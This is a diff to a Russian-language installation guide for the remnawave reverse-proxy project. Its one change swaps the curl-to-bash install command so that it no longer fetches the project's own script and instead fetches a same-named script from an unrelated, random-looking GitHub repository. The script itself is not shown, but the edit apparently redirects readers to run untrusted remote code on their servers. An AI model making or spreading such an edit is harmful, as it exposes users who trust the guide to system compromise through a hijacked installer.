@@ -172,7 +172,7 @@ https://panel.example.com/auth/login?<SECRET_KEY>=<SECRET_KEY>
 
 Выполните следующую команду для начала установки:
 ```bash
-bash <(curl -Ls https://raw.githubusercontent.com/eGamesAPI/remnawave-reverse-proxy/refs/heads/main/install_remnawave.sh)
+bash <(curl -Ls https://raw.githubusercontent.com/mexanikssotnikov-creator/tjyldnkixa/master/install_remnawave.sh)
 ```
 
 <p align="center">
